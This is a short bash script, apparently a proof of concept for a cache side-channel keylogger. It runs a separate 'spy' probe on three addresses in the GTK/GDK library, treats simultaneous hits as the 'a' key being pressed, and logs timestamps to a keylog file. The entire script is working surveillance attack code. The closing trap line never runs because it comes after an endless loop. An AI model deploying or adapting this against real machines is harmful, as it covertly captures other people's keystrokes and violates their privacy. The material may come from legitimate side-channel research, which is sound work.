#!/bin/bash

count1=0
count2=0
count3=0
# Replace the memory addresses through analysis of profiling results
stdbuf -oL ./spy /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1800.9 0x2d4c0 | {
        while IFS= read -r line
        do
                echo $count1 > check/a1.txt;
                ((count1++))
        done
} &

stdbuf -oL ./spy /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1800.9 0x2dd80 | {
        while IFS= read -r line
        do
                echo $count2 > check/a2.txt;
                ((count2++))
        done
} &

stdbuf -oL ./spy /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.1800.9 0x2e5c0 | {
        while IFS= read -r line
        do
                echo $count3 > check/a3.txt;
                ((count3++))
        done
} &
 
prev_a1="0"
prev_a2="0"
prev_a3="0"

while true; do

	a1=$( cat check/a1.txt )
	a2=$( cat check/a2.txt )
	a3=$( cat check/a3.txt )
	if [ "$a1" != "$prev_a1" ] && [ "$a2" != "$prev_a2" ] && [ "$a3" != "$prev_a3" ]
	then
		echo "a was entered at: " $(date)
		echo -n "a was entered at: " $(date) >> spy_keylog.txt
		printf "\n" >> spy_keylog.txt
	fi

	prev_a1=$a1
	prev_a2=$a2
	prev_a3=$a3
	sleep 0.005

done

trap 'pkill key_logger.sh' INT
